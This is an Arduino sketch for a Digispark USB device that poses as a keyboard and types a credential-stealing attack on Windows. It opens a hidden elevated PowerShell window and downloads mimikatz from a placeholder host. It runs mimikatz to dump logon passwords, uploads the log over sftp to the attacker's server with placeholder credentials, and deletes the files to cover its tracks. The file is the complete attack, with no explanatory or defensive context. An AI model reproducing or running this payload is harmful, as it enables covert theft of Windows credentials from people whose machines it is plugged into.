// Author : thewhiteh4t //
#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell -windowstyle hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cd $env:temp");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("(new-object System.Net.WebClient).DownloadFile('http://IPADDR/mimikatz.exe',\"$env:temp/mimikatz.exe\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print(".\\mimikatz.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("log");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("privilege::debug");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("sekurlsa::logonPasswords full");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("sftp USERNAME@IPADDR");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);
  DigiKeyboard.print("PASSWORD");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("mput mimikatz.log");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("bye");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("rm mimikatz.exe, mimikatz.log");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
